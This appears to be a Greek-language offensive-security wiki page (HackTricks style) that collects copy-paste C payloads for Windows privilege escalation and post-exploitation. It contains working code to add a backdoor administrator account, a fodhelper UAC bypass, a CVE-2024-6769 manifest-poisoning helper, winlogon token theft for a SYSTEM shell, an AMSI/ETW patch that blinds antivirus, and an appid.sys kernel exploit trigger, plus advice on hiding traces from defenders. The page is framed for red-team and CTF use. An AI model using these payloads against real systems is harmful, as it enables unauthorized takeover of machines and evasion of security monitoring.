# Windows C Payloads

{{#include ../../banners/hacktricks-training.md}}

Αυτή η σελίδα συγκεντρώνει **μικρά, αυτόνομα αποσπάσματα C** που είναι χρήσιμα κατά τη διάρκεια Windows Local Privilege Escalation ή post-exploitation. Κάθε payload έχει σχεδιαστεί να είναι **φιλικό για copy-paste**, απαιτεί μόνο το Windows API / C runtime, και μπορεί να μεταγλωττιστεί με `i686-w64-mingw32-gcc` (x86) ή `x86_64-w64-mingw32-gcc` (x64).

> ⚠️  Αυτά τα payloads υποθέτουν ότι η διαδικασία έχει ήδη τα ελάχιστα απαραίτητα προνόμια για την εκτέλεση της ενέργειας (π.χ. `SeDebugPrivilege`, `SeImpersonatePrivilege`, ή περιβάλλον μέσης ακεραιότητας για ένα UAC bypass). Προορίζονται για **red-team ή CTF περιβάλλοντα** όπου η εκμετάλλευση μιας ευπάθειας έχει οδηγήσει σε αυθαίρετη εκτέλεση εγγενούς κώδικα.

---

## Προσθήκη τοπικού χρήστη διαχειριστή
```c
// i686-w64-mingw32-gcc -s -O2 -o addadmin.exe addadmin.c
#include <stdlib.h>
int main(void) {
system("net user hacker Hacker123! /add");
system("net localgroup administrators hacker /add");
return 0;
}
```
---

## UAC Bypass – `fodhelper.exe` Registry Hijack (Medium → High integrity)
Όταν το αξιόπιστο εκτελέσιμο **`fodhelper.exe`** εκτελείται, ερωτά το παρακάτω μονοπάτι μητρώου **χωρίς να φιλτράρει το `DelegateExecute` verb**. Με την τοποθέτηση της εντολής μας κάτω από αυτό το κλειδί, ένας επιτιθέμενος μπορεί να παρακάμψει το UAC *χωρίς* να αποθηκεύσει αρχείο στο δίσκο.

*Το μονοπάτι μητρώου που ερωτάται από το `fodhelper.exe`*
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
Ένα ελάχιστο PoC που ανοίγει ένα ανυψωμένο `cmd.exe`:
```c
// x86_64-w64-mingw32-gcc -municode -s -O2 -o uac_fodhelper.exe uac_fodhelper.c
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main(void) {
HKEY hKey;
const char *payload = "C:\\Windows\\System32\\cmd.exe"; // change to arbitrary command

// 1. Create the vulnerable registry key
if (RegCreateKeyExA(HKEY_CURRENT_USER,
"Software\\Classes\\ms-settings\\Shell\\Open\\command", 0, NULL, 0,
KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {

// 2. Set default value => our payload
RegSetValueExA(hKey, NULL, 0, REG_SZ,
(const BYTE*)payload, (DWORD)strlen(payload) + 1);

// 3. Empty "DelegateExecute" value = trigger (")
RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
(const BYTE*)"", 1);

RegCloseKey(hKey);

// 4. Launch auto-elevated binary
system("fodhelper.exe");
}
return 0;
}
```
*Δοκιμάστηκε σε Windows 10 22H2 και Windows 11 23H2 (July 2025 patches). Ο bypass εξακολουθεί να λειτουργεί επειδή η Microsoft δεν έχει διορθώσει τον χαμένο έλεγχο ακεραιότητας στη διαδρομή `DelegateExecute`.*

---

## UAC Bypass – Activation Context Cache Poisoning (`ctfmon.exe`, CVE-2024-6769)
Drive remapping + activation context cache poisoning εξακολουθούν να δουλεύουν σε patched Windows 10/11 builds επειδή το `ctfmon.exe` τρέχει ως high-integrity trusted UI process που φορτώνει χωρίς πρόβλημα από το impersonated `C:` drive του καλούντος και επαναχρησιμοποιεί όποιες DLL redirections έχει cached το `CSRSS`. Η κατάχρηση γίνεται ως εξής: επαναδείξτε το `C:` σε attacker-controlled storage, τοποθετήστε ένα trojanized `msctf.dll`, ξεκινήστε το `ctfmon.exe` για να αποκτήσετε high integrity, και μετά ζητήστε από το `CSRSS` να cache-άρει ένα manifest που ανακατευθύνει ένα DLL που χρησιμοποιεί ένα auto-elevated binary (π.χ. `fodhelper.exe`) ώστε η επόμενη εκκίνηση να κληρονομήσει το payload σας χωρίς UAC prompt.

Practical workflow:
1. Ετοιμάστε ένα fake `%SystemRoot%\System32` tree και αντιγράψτε το legitimate binary που σκοπεύετε να hijack (συχνά `ctfmon.exe`).
2. Χρησιμοποιήστε `DefineDosDevice(DDD_RAW_TARGET_PATH)` για να remap-άρετε το `C:` μέσα στη διαδικασία σας, κρατώντας `DDD_NO_BROADCAST_SYSTEM` ώστε η αλλαγή να παραμείνει local.
3. Τοποθετήστε το DLL + manifest στο fake tree, καλέστε `CreateActCtx/ActivateActCtx` για να ωθήσετε το manifest στην activation-context cache, και έπειτα εκκινήστε το auto-elevated binary ώστε να επιλύσει το redirected DLL απευθείας στο shellcode σας.
4. Διαγράψτε την εγγραφή cache (`sxstrace ClearCache`) ή κάντε reboot στο τέλος για να σβήσετε τα attacker fingerprints.

<details>
<summary>C - Fake drive + manifest poison helper (CVE-2024-6769)</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shlwapi.h>
#pragma comment(lib, "shlwapi.lib")

BOOL WriteWideFile(const wchar_t *path, const wchar_t *data) {
HANDLE h = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if (h == INVALID_HANDLE_VALUE) return FALSE;
DWORD bytes = (DWORD)(wcslen(data) * sizeof(wchar_t));
BOOL ok = WriteFile(h, data, bytes, &bytes, NULL);
CloseHandle(h);
return ok;
}

int wmain(void) {
const wchar_t *stage = L"C:\\Users\\Public\\fakeC\\Windows\\System32";
SHCreateDirectoryExW(NULL, stage, NULL);
CopyFileW(L"C:\\Windows\\System32\\ctfmon.exe", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\ctfmon.exe", FALSE);
CopyFileW(L".\\msctf.dll", L"C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll", FALSE);

DefineDosDeviceW(DDD_RAW_TARGET_PATH | DDD_NO_BROADCAST_SYSTEM,
L"C:", L"\\??\\C:\\Users\\Public\\fakeC");

const wchar_t manifest[] =
L"<?xml version='1.0' encoding='UTF-8' standalone='yes'?>"
L"<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'>"
L" <dependency><dependentAssembly>"
L"  <assemblyIdentity name='Microsoft.Windows.Common-Controls' version='6.0.0.0'"
L"   processorArchitecture='amd64' publicKeyToken='6595b64144ccf1df' language='*' />"
L"  <file name='advapi32.dll' loadFrom='C:\\Users\\Public\\fakeC\\Windows\\System32\\msctf.dll' />"
L" </dependentAssembly></dependency></assembly>";
WriteWideFile(L"C:\\Users\\Public\\fakeC\\payload.manifest", manifest);

ACTCTXW act = { sizeof(act) };
act.lpSource = L"C:\\Users\\Public\\fakeC\\payload.manifest";
ULONG_PTR cookie = 0;
HANDLE ctx = CreateActCtxW(&act);
ActivateActCtx(ctx, &cookie);

STARTUPINFOW si = { sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
CreateProcessW(L"C:\\Windows\\System32\\ctfmon.exe", NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);

WaitForSingleObject(pi.hProcess, 2000);
DefineDosDeviceW(DDD_REMOVE_DEFINITION, L"C:", L"\\??\\C:\\Users\\Public\\fakeC");
return 0;
}
```
</details>

Συμβουλή καθαρισμού: μετά το popping SYSTEM, καλέστε `sxstrace Trace -logfile %TEMP%\sxstrace.etl` και στη συνέχεια `sxstrace Parse` κατά τη διάρκεια των δοκιμών — αν δείτε το όνομα του manifest στο log, το ίδιο μπορούν να το δουν και οι defenders, οπότε αλλάζετε τα paths κάθε φορά.

---

## Spawn SYSTEM shell via token duplication (`SeDebugPrivilege` + `SeImpersonatePrivilege`)
Εάν η τρέχουσα διεργασία διαθέτει **και τα δύο** `SeDebug` και `SeImpersonate` privileges (τυπικό για πολλούς service accounts), μπορείτε να κλέψετε το token από το `winlogon.exe`, να το διπλασιάσετε και να ξεκινήσετε μια διαδικασία με αυξημένα δικαιώματα:
```c
// x86_64-w64-mingw32-gcc -O2 -o system_shell.exe system_shell.c -ladvapi32 -luser32
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD FindPid(const wchar_t *name) {
PROCESSENTRY32W pe = { .dwSize = sizeof(pe) };
HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
if (snap == INVALID_HANDLE_VALUE) return 0;
if (!Process32FirstW(snap, &pe)) return 0;
do {
if (!_wcsicmp(pe.szExeFile, name)) {
DWORD pid = pe.th32ProcessID;
CloseHandle(snap);
return pid;
}
} while (Process32NextW(snap, &pe));
CloseHandle(snap);
return 0;
}

int wmain(void) {
DWORD pid = FindPid(L"winlogon.exe");
if (!pid) return 1;

HANDLE hProc   = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
HANDLE hToken  = NULL, dupToken = NULL;

if (OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &hToken) &&
DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &dupToken)) {

STARTUPINFOW si = { .cb = sizeof(si) };
PROCESS_INFORMATION pi = { 0 };
if (CreateProcessWithTokenW(dupToken, LOGON_WITH_PROFILE,
L"C\\\\Windows\\\\System32\\\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
NULL, NULL, &si, &pi)) {
CloseHandle(pi.hProcess);
CloseHandle(pi.hThread);
}
}
if (hProc) CloseHandle(hProc);
if (hToken) CloseHandle(hToken);
if (dupToken) CloseHandle(dupToken);
return 0;
}
```
Για μια πιο λεπτομερή εξήγηση του πώς λειτουργεί αυτό δείτε:

{{#ref}}
sedebug-+-seimpersonate-copy-token.md
{{#endref}}

---

## In-Memory AMSI & ETW Patch (Defence Evasion)
Οι περισσότερες σύγχρονες μηχανές AV/EDR βασίζονται στο **AMSI** και **ETW** για να ελέγχουν κακόβουλες συμπεριφορές. Το patching και των δύο διεπαφών νωρίς μέσα στην τρέχουσα διεργασία εμποδίζει τα script-based payloads (π.χ. PowerShell, JScript) από το να σαρωθούν.
```c
// gcc -o patch_amsi.exe patch_amsi.c -lntdll
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>

void Patch(BYTE *address) {
DWORD oldProt;
// mov eax, 0x80070057 ; ret  (AMSI_RESULT_E_INVALIDARG)
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(address, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProt);
memcpy(address, patch, sizeof(patch));
VirtualProtect(address, sizeof(patch), oldProt, &oldProt);
}

int main(void) {
HMODULE amsi  = LoadLibraryA("amsi.dll");
HMODULE ntdll = GetModuleHandleA("ntdll.dll");

if (amsi)  Patch((BYTE*)GetProcAddress(amsi,  "AmsiScanBuffer"));
if (ntdll) Patch((BYTE*)GetProcAddress(ntdll, "EtwEventWrite"));

MessageBoxA(NULL, "AMSI & ETW patched!", "OK", MB_OK);
return 0;
}
```
*Η επιδιόρθωση παραπάνω είναι τοπική στη διεργασία· η εκκίνηση ενός νέου PowerShell μετά την εκτέλεσή της θα τρέξει χωρίς έλεγχο AMSI/ETW.*

---

## Δημιουργία child ως Protected Process Light (PPL)
Ζητήστε επίπεδο προστασίας PPL για ένα child κατά τη δημιουργία χρησιμοποιώντας `STARTUPINFOEX` + `PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL`. Πρόκειται για τεκμηριωμένο API και θα επιτύχει μόνο εάν το target image είναι υπογεγραμμένο για την αιτούμενη signer class (Windows/WindowsLight/Antimalware/LSA/WinTcb).
```c
// x86_64-w64-mingw32-gcc -O2 -o spawn_ppl.exe spawn_ppl.c
#include <windows.h>

int wmain(void) {
STARTUPINFOEXW si = {0};
PROCESS_INFORMATION pi = {0};
si.StartupInfo.cb = sizeof(si);

SIZE_T attrSize = 0;
InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attrSize);
InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attrSize);

DWORD lvl = PROTECTION_LEVEL_ANTIMALWARE_LIGHT; // choose the desired level
UpdateProcThreadAttribute(si.lpAttributeList, 0,
PROC_THREAD_ATTRIBUTE_PROTECTION_LEVEL,
&lvl, sizeof(lvl), NULL, NULL);

if (!CreateProcessW(L"C\\\Windows\\\System32\\\notepad.exe", NULL, NULL, NULL, FALSE,
EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, &si.StartupInfo, &pi)) {
// likely ERROR_INVALID_IMAGE_HASH (577) if the image is not properly signed for that level
return 1;
}
DeleteProcThreadAttributeList(si.lpAttributeList);
HeapFree(GetProcessHeap(), 0, si.lpAttributeList);
CloseHandle(pi.hThread);
CloseHandle(pi.hProcess);
return 0;
}
```
Επίπεδα που χρησιμοποιούνται πιο συχνά:
- `PROTECTION_LEVEL_WINDOWS_LIGHT` (2)
- `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` (3)
- `PROTECTION_LEVEL_LSA_LIGHT` (4)

Επικυρώστε το αποτέλεσμα με Process Explorer/Process Hacker ελέγχοντας τη στήλη Protection.

---

## Local Service -> Kernel μέσω `appid.sys` Smart-Hash (`IOCTL 0x22A018`, CVE-2024-21338)
`appid.sys` εκθέτει ένα device object (`\\.\\AppID`) του οποίου το smart-hash maintenance IOCTL δέχεται δείκτες συναρτήσεων που παρέχονται από τον χρήστη όποτε ο caller τρέχει ως `LOCAL SERVICE`· η ομάδα Lazarus εκμεταλλεύεται αυτό για να απενεργοποιήσει το PPL και να φορτώσει arbitrary drivers, οπότε οι red teams θα πρέπει να έχουν έναν έτοιμο trigger για χρήση στο εργαστήριο.

Λειτουργικές σημειώσεις:
- Χρειάζεστε ακόμα ένα token `LOCAL SERVICE`. Κλέψτε το από `Schedule` ή `WdiServiceHost` χρησιμοποιώντας `SeImpersonatePrivilege`, και στη συνέχεια κάντε impersonate πριν πειράξετε τη συσκευή ώστε οι έλεγχοι ACL να περάσουν.
- Το IOCTL `0x22A018` περιμένει μια struct που περιέχει δύο δείκτες callback (query length + read function). Δείξτε και τους δύο σε user-mode stubs που δημιουργούν ένα token overwrite ή map ring-0 primitives, αλλά κρατήστε τα buffers RWX ώστε το KernelPatchGuard να μην καταρρεύσει στη μέση της αλυσίδας.
- Μετά την επιτυχία, βγείτε από το impersonation και επαναφέρετε το handle της συσκευής· οι defenders τώρα ψάχνουν για απροσδόκητα `Device\\AppID` handles, οπότε κλείστε το αμέσως μόλις αποκτηθεί το privilege.

<details>
<summary>C - Σκελετός trigger για κατάχρηση του `appid.sys` smart-hash</summary>
```c
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>

typedef struct _APPID_SMART_HASH {
ULONGLONG UnknownCtx[4];
PVOID QuerySize;   // called first
PVOID ReadBuffer;  // called with size returned above
BYTE  Reserved[0x40];
} APPID_SMART_HASH;

DWORD WINAPI KernelThunk(PVOID ctx) {
// map SYSTEM shellcode, steal token, etc.
return 0;
}

int wmain(void) {
HANDLE hDev = CreateFileW(L"\\\\.\\AppID", GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
if (hDev == INVALID_HANDLE_VALUE) {
printf("[-] CreateFileW failed: %lu\n", GetLastError());
return 1;
}

APPID_SMART_HASH in = {0};
in.QuerySize = KernelThunk;
in.ReadBuffer = KernelThunk;

DWORD bytes = 0;
if (!DeviceIoControl(hDev, 0x22A018, &in, sizeof(in), NULL, 0, &bytes, NULL)) {
printf("[-] DeviceIoControl failed: %lu\n", GetLastError());
}
CloseHandle(hDev);
return 0;
}
```
</details>

Ελάχιστη διόρθωση για ένα weaponized build: χαρτογραφήστε μια περιοχή RWX με `VirtualAlloc`, αντιγράψτε εκεί το token duplication stub σας, θέστε `KernelThunk = section`, και μόλις επιστρέψει το `DeviceIoControl` θα πρέπει να είστε SYSTEM ακόμα και υπό PPL.

---

## Αναφορές
* Ron Bowes – “Fodhelper UAC Bypass Deep Dive” (2024)
* SplinterCode – “AMSI Bypass 2023: The Smallest Patch Is Still Enough” (BlackHat Asia 2023)
* CreateProcessAsPPL – ελάχιστος εκκινητής διαδικασίας PPL: https://github.com/2x7EQ13/CreateProcessAsPPL
* Microsoft Docs – STARTUPINFOEX / InitializeProcThreadAttributeList / UpdateProcThreadAttribute
* DarkReading – ["Novel Exploit Chain Enables Windows UAC Bypass"](https://www.darkreading.com/vulnerabilities-threats/windows-activation-context-cache-elevation) (2024)
* Avast Threat Labs – ["Lazarus Deploys New FudModule Rootkit"](https://decoded.avast.io/threatresearch/lazarus-deploys-new-fudmodule-rootkit/) (2024)

{{#include ../../banners/hacktricks-training.md}}
